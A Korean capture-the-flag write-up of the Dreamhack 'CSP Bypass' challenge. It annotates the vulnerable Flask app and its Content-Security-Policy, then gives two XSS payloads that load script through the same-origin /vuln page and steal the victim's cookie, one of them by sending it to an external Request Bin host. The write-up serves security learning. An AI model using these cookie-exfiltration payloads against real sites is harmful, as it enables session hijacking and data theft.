# [Dreamhack Wargame] CSP Bypass
### [🚩CSP Bypass](https://dreamhack.io/wargame/challenges/435/)
  <img width="1070" alt="CSP Bypass_description" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/1c3b77c5-a133-45dc-b26a-8a099cb17224">

* CSP를 이용해 XSS 취약점이 발생해도 공격할 수 없도록 설정하였으나 잘못 설정된 부분을 찾아 우회하는 실습

<br/><br/>

## 문제 파일(app.py) 분석
```python
#!/usr/bin/python3
from flask import Flask, request, render_template
from selenium import webdriver
import urllib
import os

app = Flask(__name__)
app.secret_key = os.urandom(32)
nonce = os.urandom(16).hex()

try:
    FLAG = open("./flag.txt", "r").read()
except:
    FLAG = "[**FLAG**]"


def read_url(url, cookie={"name": "name", "value": "value"}):
    cookie.update({"domain": "127.0.0.1"})
    try:
        options = webdriver.ChromeOptions()
        for _ in [
            "headless",
            "window-size=1920x1080",
            "disable-gpu",
            "no-sandbox",
            "disable-dev-shm-usage",
        ]:
            options.add_argument(_)
        driver = webdriver.Chrome("/chromedriver", options=options)
        driver.implicitly_wait(3)
        driver.set_page_load_timeout(3)
        driver.get("http://127.0.0.1:8000/")
        driver.add_cookie(cookie)
        driver.get(url)
    except Exception as e:
        driver.quit()
        # return str(e)
        return False
    driver.quit()
    return True


def check_xss(param, cookie={"name": "name", "value": "value"}):
    # 전달받은 param 값을 param 파라미터의 값으로 하여 vuln 페이지에 접속하는 URL 주소를 생성함
    url = f"http://127.0.0.1:8000/vuln?param={urllib.parse.quote(param)}"
    
    # read_url 함수에 생성한 주소와 쿠키 값을 인자로 넘겨주어 vuln 페이지에 접속함
    return read_url(url, cookie)


@app.after_request
def add_header(response): # HTTP 응답에 CSP 헤더를 추가하는 함수
    global nonce
    response.headers[ # CSP 정책 지시문 내용 (아래의 표를 참고)
        "Content-Security-Policy"
    ] = f"default-src 'self'; img-src https://dreamhack.io; style-src 'self' 'unsafe-inline'; script-src 'self' 'nonce-{nonce}'"
    nonce = os.urandom(16).hex()
    return response


# 인덱스 페이지
@app.route("/")
def index():
    return render_template("index.html", nonce=nonce)


# vuln 페이지: 이용자가 입력한 값을 그대로 출력함
@app.route("/vuln")
def vuln():
    param = request.args.get("param", "") # 이용자가 전달한 param 파라미터의 값을 가져옴
    return param # 이용자의 입력값을 return 문을 이용해 그대로 출력함


# flag 페이지: 전달된 URL에 임의 이용자가 접속하게끔 함 (해당 이용자의 쿠키에는 FLAG가 존재함)
@app.route("/flag", methods=["GET", "POST"])
def flag():
    if request.method == "GET": # GET 메소드로 요청 시
        return render_template("flag.html", nonce=nonce) # 이용자에게 URL를 입력받는 페이지(flag.html)을 제공함
    elif request.method == "POST": # POST 메소드로 요청 시
        param = request.form.get("param") # 이용자가 입력한 param의 값을 가져옴
        if not check_xss(param, {"name": "flag", "value": FLAG.strip()}): # param 파라미터의 값과 쿠키에 FLAG를 포함하여 check_xss 함수를 호출함
            return f'<script nonce={nonce}>alert("wrong??");history.go(-1);</script>'

        return f'<script nonce={nonce}>alert("good");history.go(-1);</script>'


memo_text = "" # memo 페이지에서 사용할 변수

# memo 페이지: 이용자가 메모를 남길 수 있으며, 작성한 메모를 출력함
@app.route("/memo")
def memo():
    global memo_text # memo_text를 전역으로 설정
    text = request.args.get("memo", "") # 이용자가 전달한 memo 파라미터의 값을 가져옴
    memo_text += text + "\n" # memo_text의 뒤에 이용자가 입력한 값(text)와 개행 문자(\n)를 추가함
    
    # render_template 함수를 이용해 memo_text의 값을 기록하고 출력함
    return render_template("memo.html", memo=memo_text, nonce=nonce)


app.run(host="0.0.0.0", port=8000)
```
* ```add_header``` 함수의 ```Content-Security-Policy``` HTTP 헤더에 정의된 정책 지시문
    | directive | value | 설명 |
    |---|---|------|
    | ```default-src``` | ```'self'``` | 모든 리소스의 출처를 현재 페이지와 같은 출처로 제한함 |
    | ```img-src``` | ```https://dreamhack.io```| 이미지의 출처를 ```https://dreamhack.io```로 제한함 |
    | ```style-src``` | ```'self' 'unsafe-inline'``` | 스타일시트의 권한과 출처를 현재 페이지와 같은 출처로 제한하고, <br/> 스타일시트 내 인라인 코드의 사용을 허용함 |
    | ```script-src``` | ```'self' 'nonce-{nonce}'``` | 스크립트 태그의 출처는 현재 페이지와 같은 출처로 제한하고, <br/> nonce 속성에 {nonce} 값이 존재하지 않으면 스크립트 로드에 실패함 |
    - 📌 공격자는 ```nonce``` 값을 알지 못하기 때문에 XSS 취약점이 존재해도 일반적인 방법으로는 공격을 수행할 수 없음
      <img width="2560" alt="CSP 정책 - 공격 실패" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/42853a34-8e85-4969-b2ac-46ad17cdff98">


<br/><br/>

## 문제 풀이
### 취약점이 존재하는 부분
vuln 페이지에서 전달된 탬플릿 변수를 기록할 때 HTTML 엔티티 코드로 변환해 XSS 취약점이 발생하지 않는 ```render_template``` 함수를 이용하지 않고 ```return```을 통해 이용자의 입력값을 페이지에 그대로 출력하기 때문에 XSS 취약점이 발생함
* CSP 정책이 적용되어 있어 곧바로 스크립트를 실행하는 것은 불가능함 → 스크립트를 실행하기 위해선 ```script-src``` 지시문의 출처를 확인해봐야 함
    - CSP 정책에서 허용하고 있는 스크립트 태그의 출처는 ```self``` → 같은 출처 내에서 파일을 업로드하거나 원하는 내용을 반환하는 페이지가 존재한다면 이를 공격에 이용할 수 있음
        + 📌 CSP 정책을 우회하기 위해 ```script``` 태그의 ```src```를 vuln 페이지로 사용함 → **CSP 정책에서 제한하고 있는 ```self``` 출처를 위반하지 않은 채로 원하는 스크립트를 로드할 수 있음**
          <img width="2560" alt="CSP 정책 우회 가능 여부 확인" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/bb665ddd-3098-486b-a489-384a3f2a9bc7">
    - CSP 정책에 의해 ```nonce```를 알고 있는 경우 스크립트를 실행시킬 수 있음 → ```nonce```를 예측하는 것은 불가능 (이용 불가)
* 공격에 사용할 수 있는 속성
    | 속성 | 설명 |
    |---|------|
    | location.href | 전체 URL을 반환하거나, URL을 업데이트할 수 있는 속성 |
    | document.cookie | 해당 페이지에서 사용하는 쿠키를 읽고, 쓰는 속성 |

<br/><br/>

### 익스플로잇
#### 방법 1: memo 페이지 이용
<img width="2560" alt="익스플로잇 방법 2" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/a4d2a7d2-cb69-4b73-b015-2734bd4310c9">

1. flag 페이지에서 ```<script src="/vuln?param=document.location='/memo?memo='%2bdocument.cookie;"></script>```를 입력하고 제출 버튼을 클릭함
    - 스크립트 부분은 두 단계롤 거쳐 파라미터로 해석되기 때문에 ```'/memo?memo='%2bdocument.cookie;``` 부분에서 ```+``` 대신에 ```%2b```를 사용함 (URL Decoding 되어 공백으로 해석되는 것을 방지)

2. "good" 알림창이 출력되면 memo 페이지로 이동하여 화면에 출력된 임의 이용자의 쿠키 정보(FLAG)를 획득함

<br/>

#### 방법 2: 외부 웹 서버 이용
<img width="2560" alt="익스플로잇 방법 1" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/0e9a6131-43e4-40ee-a609-ad7eb200069f">

1. 외부에서 접근 가능한 웹 서버를 준비함
    - Dreamhack에서 제공하는 [드림핵 툴즈 서비스](https://tools.dreamhack.games)의 Request Bin 기능을 이용함
        + Request Bin 항목에서 랜덤한 URL를 생성한 후 이를 이용하여 익스플로잇을 수행함

2. flag 엔드포인트에서 ```<script src="/vuln?param=document.location='http://RANDOMHOST.request.dreamhack.games/?memo='%2bdocument.cookie;"></script>```를 입력하고 제출 버튼을 클릭함

3. "good" 알림창이 출력되면 웹 서버의 접속 기록을 확인하여 QueryString 부분에서 임의 이용자의 쿠키 정보(FLAG)를 획득함
